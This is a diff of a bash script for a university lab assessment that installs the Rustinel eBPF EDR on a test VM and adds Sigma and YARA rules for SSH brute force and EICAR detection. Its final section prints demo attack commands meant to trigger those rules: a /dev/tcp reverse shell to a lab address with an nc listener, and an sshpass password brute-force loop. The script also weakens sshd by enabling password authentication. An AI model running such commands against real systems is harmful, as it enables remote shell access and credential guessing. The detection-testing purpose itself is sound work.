@@ -4,61 +4,64 @@
 # 3014ICT Assessment 1  |  Chris Grul (s5501035)
 # -----------------------------------------------------------------------------
 # Runs LOCALLY ON ovc (the OpenVPN client VM). It:
-#   1. adds/updates the 3014ICT repo checkout (for the custom rules + automarker)
-#   2. installs Rustinel (open-source eBPF EDR) via its published installer
-#      (downloaded and SAVED for review first — no blind pipe-to-shell)
-#   3. runs `rustinel setup` to install the Linux ESSENTIAL rules pack and
-#      register + start the managed systemd service
+#   1. checks the eBPF prerequisites
+#   2. installs Rustinel (open-source eBPF EDR) as a package under /opt/rustinel,
+#      from its published installer (downloaded and SAVED for review first)
+#   3. runs `rustinel setup --yes` to register + start the managed service and
+#      install the detection rules
 #   4. drops in the two custom rules this activity needs (SSH brute-force Sigma;
-#      an EICAR YARA belt-and-suspenders) and points the config at them
+#      an EICAR YARA rule) and makes sure the scanners/IOC are enabled
 #   5. verifies the pipeline (doctor + the bundled `whoami` demo rule) and prints
 #      the three demo commands
 #
-# The ESSENTIAL pack already covers two of the three demos:
+# The Essential rules pack (installed by `setup`) covers two of the three demos:
 #   * EICAR test file      -> EICAR IOC set (file_scan on process-start)
 #   * Reverse shell        -> "Linux Reverse Shell via /dev/tcp" (Sigma)
-# The third (SSH brute force) is the custom rule added in step 4 — Rustinel's
-# packs don't detect auth-failure brute force natively.
+# The third (SSH brute force) is the custom rule added in step 4.
 #
-# Idempotent: safe to re-run. Requires: Ubuntu on ovc, kernel 5.8+ with BTF,
-# sudo rights. Reversible: `sudo rustinel service uninstall` removes the service.
+# The Rustinel installer drops a PORTABLE package into a directory (default
+# ./rustinel); it never adds anything to PATH. We install it to /opt/rustinel so
+# the binary path is deterministic (/opt/rustinel/rustinel), then `setup` turns
+# that package into the managed system service. The script auto-detects whether
+# `setup` produced the system layout (/etc/rustinel + /var/log/rustinel + a
+# systemd unit) or left things package-local, and configures either way.
+#
+# Idempotent; run as root (sudo) or as a sudo-capable user. Reversible:
+# `sudo /opt/rustinel/rustinel service uninstall` (or `... setup --revert`).
 #
 # Usage:
-#   ./setup-rustinel.sh                 # install + configure + verify
-#   ./setup-rustinel.sh --pack advanced # use the Advanced pack instead
-#   ./setup-rustinel.sh --enable-ssh-passwords   # ALSO turn on sshd password
-#                       auth so the brute-force demo can generate failed attempts
-#                       (opt-in; a backup of sshd_config is written; reversible)
+#   sudo ./setup-rustinel.sh
+#   sudo ./setup-rustinel.sh --enable-ssh-passwords   # also enable sshd password
+#                 auth so the brute-force demo can generate failed attempts
+#                 (opt-in; backs up sshd_config; reversible)
 # =============================================================================
 set -euo pipefail
 
 # ---- Settings ---------------------------------------------------------------
-REPO_URL="${REPO_URL:-https://github.com/chris-grul/3014ICT.git}"
-REPO_REF="${REPO_REF:-main}"
-REPO_DIR="${REPO_DIR:-$HOME/3014ICT}"
-SUBDIR="Assessment 1/activity5"
-PAT_FILE="${PAT_FILE:-$HOME/gh-pat.key}"     # optional; used only if the repo is private
-PACK="essential"                              # essential | advanced
-ENABLE_SSH_PW=0
+PKG="${RUSTINEL_DIR:-/opt/rustinel}"          # where the Rustinel package is installed
+BIN="$PKG/rustinel"                           # the binary (installer never touches PATH)
 INSTALL_URL="https://rustinel.io/install.sh"
-CONFIG="/etc/rustinel/config.toml"
+SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"   # this script lives in the repo …
+RULES_SRC="$SCRIPT_DIR/rules"                 # … so the custom rules sit right beside it
+ENABLE_SSH_PW=0
 
 for a in "$@"; do
     case "$a" in
-        --pack) : ;; essential|advanced) PACK="$a" ;;
-        --pack=*) PACK="${a#*=}" ;;
         --enable-ssh-passwords) ENABLE_SSH_PW=1 ;;
-        -h|--help) sed -n '2,40p' "$0"; exit 0 ;;
+        -h|--help) sed -n '2,45p' "$0"; exit 0 ;;
         *) echo "unknown arg: $a" >&2; exit 2 ;;
     esac
 done
+
+# root / sudo: run privileged steps with $SUDO (empty when already root)
+if [ "$(id -u)" -eq 0 ]; then SUDO=""; else SUDO="sudo"; fi
 
 say()  { printf '\n\033[1;36m== %s\033[0m\n' "$*"; }
 ok()   { printf '  \033[32m[ok]\033[0m %s\n' "$*"; }
 info() { printf '  \033[36m[..]\033[0m %s\n' "$*"; }
 warn() { printf '  \033[33m[!!]\033[0m %s\n' "$*"; }
 
-# ---- 0. Preflight: kernel / BTF / eBPF prerequisites ------------------------
+# ---- 0. Preflight: eBPF prerequisites ---------------------------------------
 say "Preflight — eBPF prerequisites (kernel 5.8+ with BTF)"
 KREL="$(uname -r)"; KMAJ="${KREL%%.*}"; KMIN="$(echo "$KREL" | cut -d. -f2)"
 if [ "$KMAJ" -gt 5 ] || { [ "$KMAJ" -eq 5 ] && [ "$KMIN" -ge 8 ]; }; then
@@ -71,67 +74,64 @@ if [ -r /sys/kernel/btf/vmlinux ]; then ok "BTF present (/sys/kernel/btf/vmlinux
 fi
 for fs in tracefs debugfs; do
     if mount 2>/dev/null | grep -q " type $fs "; then ok "$fs mounted"; else
-        info "$fs not shown as mounted (Rustinel/`setup` will mount it if it can)"; fi
+        info "$fs not shown as mounted (setup will mount it if it can)"; fi
 done
 
-# ---- 1. Add the repo (for the custom rules + the automarker) -----------------
-say "Repo — add/update $REPO_DIR"
-AUTH=()
-if [ -f "$PAT_FILE" ]; then
-    PAT="$(tr -d ' \n\r\t' < "$PAT_FILE")"
-    AUTH=(-c "http.extraheader=Authorization: Bearer $PAT")   # not persisted in config
-fi
-if [ -d "$REPO_DIR/.git" ]; then
-    git "${AUTH[@]}" -C "$REPO_DIR" fetch --quiet origin "$REPO_REF" \
-        && git -C "$REPO_DIR" reset --hard --quiet "origin/$REPO_REF" \
-        && ok "updated $REPO_DIR -> origin/$REPO_REF" \
-        || warn "could not update repo (offline / private without PAT) — using existing checkout"
-elif git "${AUTH[@]}" clone --quiet --branch "$REPO_REF" "$REPO_URL" "$REPO_DIR"; then
-    ok "cloned $REPO_URL -> $REPO_DIR"
+# ---- 1. Locate the custom rules ---------------------------------------------
+say "Custom rules source"
+if [ -d "$RULES_SRC" ]; then
+    ok "using rules beside this script: $RULES_SRC"
 else
-    warn "clone failed — continuing with rules embedded in this script"
+    warn "no rules dir at $RULES_SRC — will fall back to copies embedded in this script"
+    RULES_SRC=""
 fi
-unset PAT 2>/dev/null || true
-RULES_SRC="$REPO_DIR/$SUBDIR/rules"
 
-# ---- 2. Install Rustinel (download + SAVE for review, then run) --------------
-say "Install Rustinel"
-if command -v rustinel >/dev/null 2>&1; then
-    ok "rustinel already installed: $(command -v rustinel)  ($(rustinel --version 2>/dev/null | head -1))"
+# ---- 2. Install the Rustinel package to /opt/rustinel -----------------------
+# The installer places a portable package into --dir and prints its own sha256.
+# We save it first (no blind pipe-to-shell), then install to a fixed location.
+say "Install Rustinel -> $PKG"
+if [ -x "$BIN" ]; then
+    ok "already installed: $BIN ($("$BIN" --version 2>/dev/null | head -1))"
 else
     TMP="$(mktemp -d)"
     info "downloading installer to $TMP/install.sh (review it before it runs)"
     curl -fsSLo "$TMP/install.sh" "$INSTALL_URL"
     printf '  ----- installer sha256 -----\n'; sha256sum "$TMP/install.sh" | sed 's/^/  /'
-    sh "$TMP/install.sh"                 # installs the binary (no --run: we use the service)
-    hash -r 2>/dev/null || true
-    command -v rustinel >/dev/null 2>&1 && ok "installed: $(command -v rustinel)" \
-        || { warn "rustinel not on PATH after install — check $TMP/install.sh output"; exit 1; }
+    # --dir pins the location; --force lets a re-run replace a partial install.
+    $SUDO sh "$TMP/install.sh" --dir "$PKG" --force
+    [ -x "$BIN" ] || { warn "expected binary not found at $BIN after install — check the installer output"; exit 1; }
+    ok "installed: $BIN ($("$BIN" --version 2>/dev/null | head -1))"
 fi
 
-# ---- 3. Managed setup: Essential pack + systemd service ---------------------
-say "Rustinel setup — $PACK pack + managed service"
-sudo rustinel setup --pack "$PACK" --yes
-ok "setup complete (rules pack '$PACK' installed, service registered + started)"
+# ---- 3. Managed setup: register + start the service, install rules ----------
+say "Rustinel setup — register the managed service + install the rules"
+PACKFLAG=""
+if $SUDO "$BIN" setup --help 2>&1 | grep -q -- '--pack'; then PACKFLAG="--pack essential"; fi
+$SUDO "$BIN" setup $PACKFLAG --yes
+ok "setup complete${PACKFLAG:+ ($PACKFLAG)}"
 
-# ---- 4. Install the two custom rules + point the config at them -------------
+# ---- 3b. Detect the resulting layout (system vs package-local) --------------
+CONFIG=""
+for c in /etc/rustinel/config.toml "$PKG/config.toml"; do [ -f "$c" ] && CONFIG="$c" && break; done
+if [ -z "$CONFIG" ]; then warn "no config.toml found (looked in /etc/rustinel and $PKG) — cannot continue"; exit 1; fi
+tomlval() { awk -F\" -v k="$1" '$0 ~ "^[[:space:]]*"k"[[:space:]]*=" {print $2; exit}' "$CONFIG" 2>/dev/null; }
+if [ "$CONFIG" = /etc/rustinel/config.toml ]; then MODE=system; RULES_ROOT=/var/lib/rustinel/rules; LOGDEF=/var/log/rustinel
+else MODE=portable; RULES_ROOT="$PKG/rules"; LOGDEF="$PKG/logs"; fi
+SIGDIR="$(tomlval sigma_rules_path)"; SIGDIR="${SIGDIR:-$RULES_ROOT/sigma}"
+YARDIR="$(tomlval yara_rules_path)";  YARDIR="${YARDIR:-$RULES_ROOT/yara}"
+ALERTDIR="$(tomlval directory)";      ALERTDIR="${ALERTDIR:-$LOGDEF}"
+ok "layout: $MODE  |  config=$CONFIG  |  rules=$RULES_ROOT  |  alerts=$ALERTDIR"
+
+# ---- 4. Install the two custom rules ----------------------------------------
 say "Custom rules (SSH brute-force Sigma + EICAR YARA)"
-# Discover the rule dirs the config actually uses; fall back to the managed defaults.
-sigdir="$(awk -F\" '/^[[:space:]]*sigma_rules_path/{print $2}' "$CONFIG" 2>/dev/null)"
-yardir="$(awk -F\" '/^[[:space:]]*yara_rules_path/{print $2}'  "$CONFIG" 2>/dev/null)"
-sigdir="${sigdir:-/var/lib/rustinel/rules/sigma}"
-yardir="${yardir:-/var/lib/rustinel/rules/yara}"
-sudo mkdir -p "$sigdir" "$yardir"
-
-install_rule() {   # <src-in-repo> <dst-dir> | falls back to embedded copy
-    local name="$1" dst="$2"
-    if [ -f "$RULES_SRC/$3/$name" ]; then
-        sudo install -m 0644 "$RULES_SRC/$3/$name" "$dst/$name" && ok "installed $3/$name (from repo)"
+$SUDO mkdir -p "$SIGDIR" "$YARDIR"
+put_rule() {  # <name> <dstdir> <repo-subdir> <embed-fn>
+    if [ -n "$RULES_SRC" ] && [ -f "$RULES_SRC/$3/$1" ]; then
+        $SUDO install -m 0644 "$RULES_SRC/$3/$1" "$2/$1" && ok "installed $3/$1 (from repo)"
     else
-        emit_"$4" | sudo tee "$dst/$name" >/dev/null && ok "installed $3/$name (embedded fallback)"
+        "emit_$4" | $SUDO tee "$2/$1" >/dev/null && ok "installed $3/$1 (embedded fallback)"
     fi
 }
-
 emit_ssh_sigma() { cat <<'YML'
 title: SSH Password Brute Force - Repeated PAM Verification via unix_chkpwd
 id: 87d4f965-e566-4d77-8d17-c6fb0c2fe706
@@ -179,32 +179,28 @@ rule EICAR_Test_File
 }
 YAR
 }
-
-install_rule "lin_ssh_bruteforce_unix_chkpwd.yml"       "$sigdir" sigma ssh_sigma
-install_rule "lin_ssh_bruteforce_unix_chkpwd_broad.yml" "$sigdir" sigma ssh_sigma_broad
-install_rule "eicar_test.yar"                           "$yardir" yara  eicar_yara
+put_rule "lin_ssh_bruteforce_unix_chkpwd.yml"       "$SIGDIR" sigma ssh_sigma
+put_rule "lin_ssh_bruteforce_unix_chkpwd_broad.yml" "$SIGDIR" sigma ssh_sigma_broad
+put_rule "eicar_test.yar"                           "$YARDIR" yara  eicar_yara
 
 # Make sure the scanners + IOC matching are enabled (setup normally sets these).
 ensure_toml() {  # <section> <key> <value>
-    sudo python3 - "$CONFIG" "$1" "$2" "$3" <<'PY' 2>/dev/null || warn "could not verify [$1] $2 in $CONFIG — check it manually"
+    $SUDO python3 - "$CONFIG" "$1" "$2" "$3" <<'PY' 2>/dev/null || warn "could not verify [$1] $2 in $CONFIG — check it manually"
 import sys,re,pathlib
 path,section,key,val=sys.argv[1:5]
 p=pathlib.Path(path); t=p.read_text() if p.exists() else ""
-want=f"{key} = {val}"
-lines=t.splitlines(); out=[]; in_sec=False; done=False; sechdr=f"[{section}]"
+want=f"{key} = {val}"; lines=t.splitlines(); out=[]; in_sec=False; done=False; sechdr=f"[{section}]"
 for ln in lines:
     s=ln.strip()
     if s.startswith("[") and s.endswith("]"):
         if in_sec and not done: out.append(want); done=True
-        in_sec = (s==sechdr)
-    if in_sec and re.match(rf"\s*{re.escape(key)}\s*=", ln):
-        out.append(want); done=True; continue
+        in_sec=(s==sechdr)
+    if in_sec and re.match(rf"\s*{re.escape(key)}\s*=", ln): out.append(want); done=True; continue
     out.append(ln)
 if not done:
     if sechdr not in t: out.append(sechdr)
     out.append(want)
-p.write_text("\n".join(out)+"\n")
-print("set")
+p.write_text("\n".join(out)+"\n"); print("set")
 PY
 }
 ensure_toml scanner sigma_enabled true
@@ -216,58 +212,60 @@ ok "scanner (sigma+yara) and IOC matching enabled"
 if [ "$ENABLE_SSH_PW" = 1 ]; then
     say "Enable sshd PasswordAuthentication (opt-in, for the brute-force demo)"
     SSHD=/etc/ssh/sshd_config
-    sudo cp -a "$SSHD" "${SSHD}.act5.bak"
-    sudo sed -i -E 's/^[#[:space:]]*PasswordAuthentication\s+.*/PasswordAuthentication yes/' "$SSHD"
-    grep -qE '^PasswordAuthentication yes' <(sudo cat "$SSHD") || echo 'PasswordAuthentication yes' | sudo tee -a "$SSHD" >/dev/null
-    # drop-in files can override sshd_config — neutralise any that force it off
+    $SUDO cp -a "$SSHD" "${SSHD}.act5.bak"
+    $SUDO sed -i -E 's/^[#[:space:]]*PasswordAuthentication\s+.*/PasswordAuthentication yes/' "$SSHD"
+    $SUDO grep -qE '^PasswordAuthentication yes' "$SSHD" || echo 'PasswordAuthentication yes' | $SUDO tee -a "$SSHD" >/dev/null
     for d in /etc/ssh/sshd_config.d/*.conf; do
         [ -e "$d" ] || continue
-        sudo sed -i -E 's/^[#[:space:]]*PasswordAuthentication\s+no/PasswordAuthentication yes/' "$d"
+        $SUDO sed -i -E 's/^[#[:space:]]*PasswordAuthentication\s+no/PasswordAuthentication yes/' "$d"
     done
-    sudo sshd -t && sudo systemctl restart ssh 2>/dev/null || sudo systemctl restart sshd 2>/dev/null || true
+    $SUDO sshd -t && { $SUDO systemctl restart ssh 2>/dev/null || $SUDO systemctl restart sshd 2>/dev/null || true; }
+    $SUDO apt-get install -y sshpass >/dev/null 2>&1 && ok "sshpass installed (for the brute-force demo)" || warn "could not auto-install sshpass — 'sudo apt-get install -y sshpass' before demo 3"
     ok "PasswordAuthentication enabled (backup: ${SSHD}.act5.bak — revert after the demo)"
 fi
 
-# ---- 5. Reload the service so the custom rules load, then verify -------------
+# ---- 5. Reload + verify -----------------------------------------------------
 say "Reload + verify"
-sudo rustinel service restart 2>/dev/null || sudo systemctl restart rustinel 2>/dev/null || true
-sleep 2
-sudo rustinel service status || true
-echo; info "health check:"; sudo rustinel doctor || true
+if [ "$MODE" = system ] && systemctl list-unit-files 2>/dev/null | grep -q '^rustinel'; then
+    $SUDO systemctl restart rustinel 2>/dev/null || $SUDO "$BIN" service restart 2>/dev/null || true
+    sleep 2
+    echo -n "  service: "; systemctl is-active rustinel 2>/dev/null || true
+else
+    $SUDO "$BIN" service restart 2>/dev/null || true
+    warn "no systemd 'rustinel' unit detected — running in $MODE mode. Start it with: sudo $BIN run   (or: cd $PKG && sudo ./rustinel run)"
+fi
+echo; info "health check:"; $SUDO "$BIN" doctor 2>&1 | sed 's/^/    /' | head -20 || true
 
 # Bundled demo rule: running whoami should produce an alert.
-ALERTDIR="$(awk -F\" '/^[[:space:]]*directory/{print $2}' "$CONFIG" 2>/dev/null)"; ALERTDIR="${ALERTDIR:-/var/log/rustinel}"
-echo; info "triggering the bundled 'whoami' demo rule…"; whoami >/dev/null; sleep 2
-if sudo sh -c "ls $ALERTDIR/alerts.json* >/dev/null 2>&1"; then
+echo; info "triggering the bundled 'whoami' demo rule…"; whoami >/dev/null 2>&1; sleep 2
+if $SUDO sh -c "ls \"$ALERTDIR\"/alerts.json* >/dev/null 2>&1"; then
     ok "alerts are being written to $ALERTDIR/alerts.json*"
-    sudo sh -c "tail -n 2 $ALERTDIR/alerts.json* 2>/dev/null" | sed 's/^/    /' || true
+    $SUDO sh -c "tail -n 2 \"$ALERTDIR\"/alerts.json* 2>/dev/null" | sed 's/^/    /' || true
 else
-    warn "no alert file yet in $ALERTDIR — check 'sudo rustinel doctor' and 'journalctl -u rustinel'"
+    warn "no alert file yet in $ALERTDIR — make sure the agent is running (see above) and re-run 'whoami'"
 fi
 
-# ---- 6. Print the three demo commands --------------------------------------
+# ---- 6. Print the three demo commands ---------------------------------------
 say "Activity 5 demos (run these to test the tool)"
 cat <<EOF
-  1) EICAR test file (download, then execute so the scan-on-process-start fires):
+  1) EICAR test file (download + execute so the scan-on-process-start fires):
        wget -qO ~/eicar.com https://secure.eicar.org/eicar.com.txt
        chmod +x ~/eicar.com && ~/eicar.com 2>/dev/null; echo done
-     (Rustinel scans on process-start, so the file must be EXECUTED, not just saved.
-      If wget is unavailable, the README has an offline echo-the-signature method.)
      -> expect an EICAR IOC/YARA alert in $ALERTDIR/alerts.json*
 
   2) Network intrusion — reverse shell via /dev/tcp (fires the bundled Sigma rule):
-       # start a listener on a reachable lab host first, e.g. on igw:  nc -lvnp 4444
-       bash -i >& /dev/tcp/10.8.0.1/4444 0>&1
+       # optional listener on a reachable lab host, e.g. on igw:  nc -lvnp 4444
+       bash -c 'bash -i >& /dev/tcp/10.8.0.1/4444 0>&1'
      -> expect a "Linux Reverse Shell via /dev/tcp" alert
 
   3) SSH brute force (fires the custom rule; needs sshd password auth ON — see
-     --enable-ssh-passwords). From an attacker host, hammer ovc's SSH with wrong
-     passwords, e.g.:
+     --enable-ssh-passwords). From an attacker host (or localhost) hammer SSH:
        for i in \$(seq 1 20); do sshpass -p wrong\$i ssh -o StrictHostKeyChecking=no \\
-         -o PreferredAuthentications=password user@<ovc-vpn-addr> true; done
+         -o PreferredAuthentications=password -o PubkeyAuthentication=no \$USER@localhost true; done
      -> expect a burst of "SSH Password Brute Force … unix_chkpwd" alerts
 
-  Tail alerts live:   sudo tail -f $ALERTDIR/alerts.json*
-  Remove everything:  sudo rustinel service uninstall
+  View alerts:   sudo tail -f $ALERTDIR/alerts.json*
+  Health:        sudo $BIN doctor
+  Remove:        sudo $BIN service uninstall     (or: sudo $BIN setup --revert)
 EOF
-ok "Activity 5 setup finished"
+ok "Activity 5 setup finished (mode: $MODE, binary: $BIN)"
